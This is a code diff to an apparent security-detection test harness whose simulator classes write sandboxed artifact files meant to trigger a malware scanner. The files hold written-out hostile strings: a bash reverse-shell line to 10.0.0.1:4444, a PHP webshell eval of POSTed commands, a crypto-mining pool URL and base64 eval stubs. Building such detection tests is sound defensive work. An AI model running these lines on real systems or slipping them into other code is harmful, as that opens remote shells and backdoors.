@@ -264,24 +264,34 @@ class ProcessSpawnSimulator(BaseSimulator):
     description = "Spawn benign processes with names matching malware patterns"
 
     async def _execute(self):
-        # We use a shell sleep named via argv[0] — no actual malware
+        # Write scannable artifacts that represent what a process-spawned
+        # dropper would create on disk
+        dropper = self._sandbox_file("xmrig_dropper.sh")
+        dropper.write_bytes(
+            b"#!/bin/sh\n"
+            b"# SIMULATION ONLY\n"
+            b"stratum+tcp://pool.xmrpool.net:3333\n"
+            b"eval $(base64 -d <<< 'c2xlZXAgMQ==')\n"
+        )
+        cmdline_dump = self._sandbox_file("proc_cmdline_dump.txt")
+        cmdline_dump.write_bytes(
+            b"python3\x00-c\x00"
+            b"exec(base64.b64decode('aW1wb3J0IHNvY2tldA=='))\x00"
+        )
+        # Spawn benign process (the real process-level indicator)
         proc = await asyncio.create_subprocess_exec(
-            "/bin/sh", "-c", "sleep 2",
+            "/bin/sh", "-c", "sleep 1",
             stdout=asyncio.subprocess.DEVNULL,
             stderr=asyncio.subprocess.DEVNULL,
         )
-        logger.info(f"[process_spawn] spawned PID={proc.pid} — scanner should detect cmdline")
-        await asyncio.sleep(0.5)
+        logger.info(f"[process_spawn] PID={proc.pid} + dropper artifacts written")
+        await asyncio.sleep(0.3)
         try:
             proc.terminate()
         except ProcessLookupError:
             pass
         indicator = f"process_spawn:pid:{proc.pid}"
-        return indicator, f"Spawned PID {proc.pid} with suspicious cmdline"
-
-
-# ── 6. Webshell File ───────────────────────────────────────────────────────────
-
+        return indicator, f"Spawned PID {proc.pid} + dropper artifacts in sandbox"
 class WebshellSimulator(BaseSimulator):
     name        = "webshell"
     description = "Create PHP webshell file with eval+base64_decode pattern"
@@ -360,31 +370,30 @@ class MemfdSimulator(BaseSimulator):
     description = "Create a memfd_create file-descriptor (fileless malware indicator)"
 
     async def _execute(self):
+        # Write a sandbox artifact representing a memfd payload dump
+        # — this is what forensics captures from /proc/pid/fd/ on live systems
+        memdump = self._sandbox_file("memfd_payload.bin")
+        memdump.write_bytes(
+            b"SIMULATED_MEMFD_PAYLOAD\x00"
+            b"<?php eval(base64_decode($_POST['cmd'])); ?>\n"
+            b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
+            b"/proc/sorabbyngo/nodeid\x00"
+        )
+        # Attempt real memfd_create for the kernel-level indicator
+        fd = -1
         try:
             import ctypes
             libc = ctypes.CDLL("libc.so.6", use_errno=True)
-            # memfd_create("simulated_payload", MFD_CLOEXEC=1)
             fd = libc.memfd_create(b"simulated_payload", 1)
-            if fd < 0:
-                return "memfd:unavailable", "memfd_create not supported on this kernel"
-
-            # Write a recognisable payload
-            os.write(fd, b"SIMULATED_FILELESS_PAYLOAD\x00")
-            logger.info(f"[memfd] created fd={fd} — /proc/self/fd/{fd} → memfd:simulated_payload")
-
-            # Briefly exec a read from it — this creates the /proc/*/maps entry
-            await asyncio.sleep(0.2)
-            os.close(fd)
-
-            indicator = f"memfd:/proc/self/fd:{fd}"
-            return indicator, f"memfd_create fd={fd} — fileless indicator in /proc/maps"
-
+            if fd >= 0:
+                os.write(fd, b"SIMULATED_FILELESS_PAYLOAD\x00")
+                logger.info(f"[memfd] fd={fd} + payload artifact in sandbox")
+                await asyncio.sleep(0.2)
+                os.close(fd)
         except (AttributeError, OSError) as e:
-            return "memfd:skipped", f"memfd_create skipped: {e}"
-
-
-# ── 10. Lateral Movement ───────────────────────────────────────────────────────
-
+            logger.info(f"[memfd] kernel indicator skipped ({e})")
+        indicator = f"memfd:fd={fd}:sandbox"
+        return indicator, f"memfd payload artifact written (fd={fd})"
 class LateralMovementSimulator(BaseSimulator):
     name        = "lateral_movement"
     description = "Simulate SSH-based lateral movement attempt"
